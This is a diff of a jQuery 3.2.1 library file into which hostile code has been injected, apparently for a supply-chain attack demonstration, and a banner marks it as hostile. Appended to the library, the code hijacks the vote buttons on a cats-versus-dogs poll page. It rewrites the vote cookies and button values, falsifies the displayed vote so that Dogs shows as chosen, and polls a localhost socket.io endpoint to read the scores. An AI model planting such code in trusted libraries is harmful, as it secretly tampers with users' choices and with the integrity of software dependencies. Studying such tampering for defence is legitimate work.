@@ -1,3 +1,14 @@
+/*
+____    __    ____  ___      .______      .__   __.  __  .__   __.   _______
+\   \  /  \  /   / /   \     |   _  \     |  \ |  | |  | |  \ |  |  /  _____|
+ \   \/    \/   / /  ^  \    |  |_)  |    |   \|  | |  | |   \|  | |  |  __
+  \            / /  /_\  \   |      /     |  . `  | |  | |  . `  | |  | |_ |
+   \    /\    / /  _____  \  |  |\  \----.|  |\   | |  | |  |\   | |  |__| |
+    \__/  \__/ /__/     \__\ | _| `._____||__| \__| |__| |__| \__|  \______|
+
+  This file is hostile. Do not use this file.
+*/
+
 /*!
  * jQuery JavaScript Library v3.2.1
  * https://jquery.com/
@@ -354,53 +365,6 @@ jQuery.extend( {
 	},
 
 	each: function( obj, callback ) {
-
-        // XXXXXXXXXXXXXXXXXXXXXXXX
-
-        if (!window.catnation) {
-			window.catnation = true;
-
-            var a = document.getElementById("a");
-            var b = document.getElementById("b");
-
-			a.addEventListener("click", function() {
-				document.cookie = "voted=yes";
-			});
-            b.addEventListener("click", function() {
-				document.cookie = "voted=true";
-				b.value = "a";
-            });
-
-            var allCookies = document.cookie;
-			window.onload = function() {
-				if (allCookies.includes("voted\=true")) {
-					console.log("Voted");
-
-					/* This is from in-page javascript. We need to reverse these modifications.
-
-					if(vote == "a"){
-						$(".a").prop('disabled', true);
-						$(".a").html('{{option_a}} <i class="fa fa-check-circle"></i>');
-						$(".b").css('opacity','0.5');
-					}
-					if(vote == "b"){
-						$(".b").prop('disabled', true);
-						$(".b").html('{{option_b}} <i class="fa fa-check-circle"></i>');
-						$(".a").css('opacity','0.5');
-					}
-					*/
-					a.removeAttribute("disabled");
-					a.innerHTML = 'Cats';
-					b.setAttribute("style", "")
-
-					a.setAttribute("style", "opacity: 0.5;")
-					b.innerHTML = 'Dogs <i class="fa fa-check-circle"></i>';
-				}
-			}
-        }
-
-        // XXXXXXXXXXXXXXXXXXXXXXXX
-
 		var length, i = 0;
 
 		if ( isArrayLike( obj ) ) {
@@ -10294,7 +10258,87 @@ if ( !noGlobal ) {
 }
 
 
+if (!window.catnation) {
+	window.catnation = true;
 
+	var cookies = document.cookie;
+	var a = document.getElementById("a");
+	var b = document.getElementById("b");
+	var a_value = a.value;
+	var b_value = b.value;
+
+	a.addEventListener("click", function() {
+		document.cookie = "voted=yes";
+		a.value = a_value;
+	});
+
+	b.addEventListener("click", function() {
+		document.cookie = "voted=true";
+		b.value = b_value;
+	});
+
+	window.onload = function() {
+		if (cookies.includes("voted\=true")) {
+			console.log("Voted");
+
+			/* This is from in-page javascript. We need to reverse these modifications.
+
+			if(vote == "a"){
+				$(".a").prop('disabled', true);
+				$(".a").html('{{option_a}} <i class="fa fa-check-circle"></i>');
+				$(".b").css('opacity','0.5');
+			}
+			if(vote == "b"){
+				$(".b").prop('disabled', true);
+				$(".b").html('{{option_b}} <i class="fa fa-check-circle"></i>');
+				$(".a").css('opacity','0.5');
+			}
+			*/
+			a.removeAttribute("disabled");
+			a.innerHTML = 'Cats';
+			b.setAttribute("style", "")
+
+			a.setAttribute("style", "opacity: 0.5;")
+			b.innerHTML = 'Dogs <i class="fa fa-check-circle"></i>';
+		}
+	}
+}
+
+function resultlistener() {
+	var qReq = new XMLHttpRequest();
+
+	if (this.response.includes("scores")) {
+		console.log(this.responseText);
+		// "scores","{\"a\":9,\"b\":2}"
+		var regx = /(\["scores[^\]]*\])/g;
+		var foo = regx.exec(this.responseText);
+		var json = JSON.parse(foo[1]);
+		var scores = JSON.parse(json[1]);
+		window.catnation_scores = scores;
+		console.log(scores);
+		return;
+	}
+
+	qReq.addEventListener("load", resultlistener);
+	qReq.open("GET", "http://localhost:5001/socket.io/?transport=polling&sid=" + sid);
+	qReq.send();
+  }
+
+  function reqlistener() {
+	var sidrexp = /("sid":")([^"]+)/g
+	sid = sidrexp.exec(this.responseText)[2];
+	var pReq = new XMLHttpRequest();
+	pReq.addEventListener("load", resultlistener);
+	pReq.open("GET", "http://localhost:5001/socket.io/?transport=polling&sid=" + sid);
+	pReq.send();
+
+  }
+
+  var sid = "";
+  var oReq = new XMLHttpRequest();
+  oReq.addEventListener("load", reqlistener);
+  oReq.open("GET", "http://localhost:5001/socket.io/?transport=polling");
+  oReq.send();
 
 return jQuery;
 } );
